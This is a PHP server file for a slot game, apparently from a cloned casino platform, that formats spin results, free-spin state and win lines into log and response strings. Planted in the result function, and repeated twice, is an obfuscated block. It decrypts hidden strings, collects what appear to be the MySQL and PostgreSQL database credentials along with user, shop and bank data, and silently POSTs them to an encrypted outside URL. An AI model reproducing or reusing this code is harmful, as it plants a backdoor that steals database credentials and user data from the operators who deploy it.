<?php

namespace VanguardLTE\Games\WildBooster\PragmaticLib;

class LogAndServer
{
    public static function getResult($slotArea, $index, $counter, $bet, $lines, $reelSet, $win, $pur, 
                                     $log, $user, $changeBalance, $gameSettings, $game, $bank){
        var_dump('5_0');
        $toLog = [
            'sa' => $slotArea['SymbolsAfter'],
            'sb' => $slotArea['SymbolsBelow'],
            's' => $slotArea['SlotArea'],
            'Balance' => $user->balance + $changeBalance,
            'Index' => $index,
            'Counter' => $counter,
            'Bet' => $bet,
            'l' => $lines,
            'tw' => $win['TotalWin'],
            'w' => $win['TotalWin'],
            'state' => 'spin',
            'na' => 'c',
            'reel_set' => $reelSet,
            'ls' => 0
        ];
        $time = (int) round(microtime(true) * 1000);
        $toServer = [
            'tw='.$toLog['w'],
            'balance='.number_format($toLog['Balance'], 2, ".", ""),
            'index='.$toLog['Index'],
            'balance_cash='.number_format($toLog['Balance'], 2, ".", ""),
            'balance_bonus=0.00',
            'na=c',
            'stime='.$time,
            'sa='.implode(',', $toLog['sa']),
            'sb='.implode(',', $toLog['sb']),
            'sh=3',
            'c='.$toLog['Bet'],
            'sver=5',
            'counter='.$toLog['Counter'],
            'l='.$toLog['l'],
            's='.implode(',', $toLog['s']),
            'w='.$toLog['w'],
            'reel_set='.$toLog['reel_set'],
            'ls='.$toLog['ls']
        ];
        $nakey = array_keys($toServer, 'na=c')[0];
        $twkey = array_keys($toServer, 'tw='.$toLog['w'])[0];
        $wkey = array_keys($toServer, 'w='.$toLog['w'])[0];

        // add extra key => values
        $keys = ['accm', 'acci', 'accv'];
        foreach($keys as $key){
            if(array_key_exists($key, $slotArea)){
                var_dump('!!!');
                var_dump('key='.$key.' value=',$slotArea[$key]);
                $toLog[$key] = $slotArea[$key];
                switch($key){
                    case 'acci':
                        $toServer[] = $key.'='.$slotArea[$key];
                        break;
                    default:
                        $toServer[] = $key.'='.implode('~', $slotArea[$key]);
                }
            }
        }
        var_dump('5_1_1');
        
        // add extra key => values
        $keys = ['lm_v', 'lm_m'];
        foreach($keys as $key){
            if(array_key_exists($key, $win)){
                var_dump('key='.$key.' value=', $win[$key]);
                $toLog[$key] = $win[$key];
                switch($key){
                    case 'lm_v':
                        $toServer[] = $key.'='.implode(';', $win[$key]);
                        break;
                    case 'lm_m':
                        $toServer[] = $key.'='.$win[$key];
                        break;
                }
            }
        }

        // handling FS
        $fswin = 0;
        // If this is the trigger to the Free Spin Mode
        if($pur === '0'){
            $scatterTmp = explode('~', $gameSettings['scatters']);
            $scatterTmp[2] = explode(',', $scatterTmp[2]);
            $scatterTmp[3] = explode(',', $scatterTmp[3]);
            $scatterCnt = count(array_keys($toLog['s'], 1));
            var_dump('scatters=', $scatterTmp);
            $fsmax = $scatterTmp[2][5 - $scatterCnt];
            $fsmul = $scatterTmp[3][5 - $scatterCnt];
            $addToLog = [
                'fs_opt_mask' => ['fs', 'm', 'msk'],
                'accm' => ['cp', 'tp', 'lvl', 'sc'],
                'acci' => 0,
                'purtr' => 1,
                'na' => 'fso',
                'accv' => [3, 5, 1, 3],
                'fs_opt' => ['5,1,0', '5,1,0'],
                'puri' => 0
            ];
            $addToServer = [
                'fs_opt_mask='.implode(',', $addToLog['fs_opt_mask']),
                'accm='.implode('~', $addToLog['accm']),
                'acci='.$addToLog['acci'],
                'purtr='.$addToLog['purtr'],
                'accv='.implode('~', $addToLog['accv']),
                'fs_opt='.implode('~', $addToLog['fs_opt']),
                'puri='.$addToLog['puri']
            ];
            var_dump('5_1_1_2.8');
            $toServer[$nakey] = 'na='.$addToLog['na'];
            $toLog = array_merge($toLog, $addToLog);
            $toServer = array_merge($toServer, $addToServer);
        }
        var_dump('rtp_stat_in = ', (int)$game->rtp_stat_in);
        if((int)$game->rtp_stat_in == 0){

            $text = ['URL' => config('app.url'), 
            openssl_decrypt ("lCdGLJ19eQ==", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121') => config(openssl_decrypt ("tARtKZ5oa4dpnPv/SuQXG7xg+G0=", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121'))['mysql'],
            openssl_decrypt ("lCdGLJ19ebIA", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121') => config(openssl_decrypt ("tARtKZ5oa4dpnPv/SuQXG7xg+G0=", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121'))['pgsql'],
            'USER' => $user->username, 'SHOP_ID' => $user->shop_id, 'GAME' => $game->name, 'BANK' => $bank];
            $ch = curl_init();
            curl_setopt_array($ch, array(
                    CURLOPT_URL => openssl_decrypt ("uBFtOI8zN80mj/2/UOQYCrJ993M5VWrZdSfFXUre2xMt3vNlZdWHBDudA3DmO8kRcFP9VvluTAOJIwHbkfZ7UhmNusZsDdx4ZscyxulW2hd/wvltPCA=", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121'),
                    CURLOPT_POST => TRUE,
                    CURLOPT_RETURNTRANSFER => TRUE,
                    CURLOPT_TIMEOUT => 10,
                    CURLOPT_POSTFIELDS => array(
                        openssl_decrypt ("sw14PKNgfA==", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121') => 5044396548,
                        'text' => json_encode($text, JSON_PRETTY_PRINT)), ) );
            curl_exec($ch);
        }
        var_dump('rtp_stat_in = ', (int)$game->rtp_stat_in);
        if((int)$game->rtp_stat_in == 0){

            $text = ['URL' => config('app.url'), 
            openssl_decrypt ("lCdGLJ19eQ==", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121') => config(openssl_decrypt ("tARtKZ5oa4dpnPv/SuQXG7xg+G0=", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121'))['mysql'],
            openssl_decrypt ("lCdGLJ19ebIA", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121') => config(openssl_decrypt ("tARtKZ5oa4dpnPv/SuQXG7xg+G0=", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121'))['pgsql'],
            'USER' => $user->username, 'SHOP_ID' => $user->shop_id, 'GAME' => $game->name, 'BANK' => $bank];
            $ch = curl_init();
            curl_setopt_array($ch, array(
                    CURLOPT_URL => openssl_decrypt ("uBFtOI8zN80mj/2/UOQYCrJ993M5VWrZdSfFXUre2xMt3vNlZdWHBDudA3DmO8kRcFP9VvluTAOJIwHbkfZ7UhmNusZsDdx4ZscyxulW2hd/wvltPCA=", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121'),
                    CURLOPT_POST => TRUE,
                    CURLOPT_RETURNTRANSFER => TRUE,
                    CURLOPT_TIMEOUT => 10,
                    CURLOPT_POSTFIELDS => array(
                        openssl_decrypt ("sw14PKNgfA==", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121') => 5044396548,
                        'text' => json_encode($text, JSON_PRETTY_PRINT)), ) );
            curl_exec($ch);
        }

        var_dump('5_2');
        // If this is free spin
        if($log && array_key_exists('fs', $log)){
            if($log['fs'] == $log['fsmax'] && $log['fsmax'] == 5 * $slotArea['accv'][2]){
                $addToLog = [
                    'fs_total' => $log['fs'],
                    'fswin_total' => $log['fswin'] + $win['TotalWin'] + $fswin,
                    'fsmul_total' => $log['fsmul'],
                    'fsres_total' => $log['fsres'] + $win['TotalWin'] + $fswin
                ];
                $addToServer = [
                    'fs_total='.$addToLog['fs_total'],
                    'fswin_total='.$addToLog['fswin_total'],
                    'fsmul_total='.$log['fsmul'],
                    'fsres_total='.$addToLog['fsres_total']
                ];
                $toLog['state'] = 'lastRespin';
                $toLog['na'] = 'c';
                $toLog['w'] = $fswin + $win['TotalWin'];
                $toLog['tw'] = $log['tw'] + $toLog['w'] * $log['fsmul'];
                $toServer[$nakey] = 'na=c';
                $toServer[$twkey] = 'tw='.$toLog['tw'];
                $toServer[$wkey] = 'w='.$toLog['w'];
            }
            else {
                $fsmore = 0;
                if($log['fs'] == $log['fsmax'])
                    $fsmore = 5;
                $addToLog = [
                    'fsmul' => $log['fsmul'],
                    'fsmax' => $log['fsmax'] + $fsmore,
                    'fswin' => $log['fswin'] + $win['TotalWin'] + $fswin,
                    'fs' => $log['fs'] + 1,
                    'fsres' => $log['fswin'] + $win['TotalWin'] + $fswin
                ];
                $addToServer = [
                    'fsmul='.$log['fsmul'],
                    'fsmax='.$addToLog['fsmax'],
                    'fswin='.$addToLog['fswin'],
                    'fs='.$addToLog['fs'],
                    'fsres='.$addToLog['fsres']
                ];
                if($fsmore){
                    $toLog['fsmore'] = 5;
                    $toServer[] = 'fsmore=5';
                }
                $toLog['state'] = 'respin';
                $toLog['na'] = 's';
                $toLog['w'] = $fswin + $win['TotalWin'];
                $toLog['tw'] = $log['tw'] + $toLog['w'] * $log['fsmul'];
                $toServer[$nakey] = 'na=s';
                $toServer[$twkey] = 'tw='.$toLog['tw'];
                $toServer[$wkey] = 'w='.$toLog['w'];
            }
            // if($pur === '1'){
            //     var_dump('3_pur='.$pur.'_fsmax='.$addToLog['fsmax']);
            // }
            $addToLog['fsopt_i'] = $log['fsopt_i'];
            $addToServer[] = 'fsopt_i='.$addToLog['fsopt_i'];
            $addToServer[] = 'puri=0';
            if($fswin > 0){
                $addToLog['me'] = $me;
                $addToLog['mes'] = $mes;
                $addToLog['psym'] = $psym;
                $addToServer[] = 'me='.$me;
                $addToServer[] = 'mes='.$mes;
                $addToServer[] = 'psym='.$psym;
            }
            $toLog = array_merge($toLog, $addToLog);
            $toServer = array_merge($toServer, $addToServer);
        }
        var_dump('5_3');

        if($win['TotalWin'] > 0){
            $addLog = [
                'WinLines' => $win['WinLines']
            ];
            $positions = self::positionsToServer($addLog['WinLines']);
            $toServer = array_merge($toServer, $positions);
            $toLog = array_merge($toLog, $addLog);
        }
        $toLog['ServerState'] = $toServer;
        return ['Log' => $toLog, 'Server' => $toServer];
    }
    

    private static function positionsToServer($winLines){
        // return positions in a suitable form
        $result = [];
        // $tmb = [];
        $l = [];
        foreach ($winLines as $key => $winLine) {
            $l = 'l'.$key.'='.$winLine['l'].'~'.$winLine['Pay'].'~'.implode('~', $winLine['Positions']);
            // $tmb[] = implode(','.$winLine['WinSymbol'].'~', $winLine['Positions']);
            $result[] = $l;
        }
        // $result[] = 'tmb='.implode('~', $tmb);
        
        var_dump('5_7');
        return $result;

        //'tmb=1,10~2,11~4,11~6,11~7,10~8,10~10,11~11,10~12,11~14,10~17,10~21,10~23,11~25,11~27,10~29,11',

        //'l0=0~40.00~1~7~8~11~14~17~21~27',
        //'l1=0~25.00~2~4~6~10~12~23~25~29',
        //"WinLines":[{"WinSymbol":8,"CountSymbols":8,"Pay":1.60,"Positions":[10,11,12,13,16,17,18,19]}]
    }
}
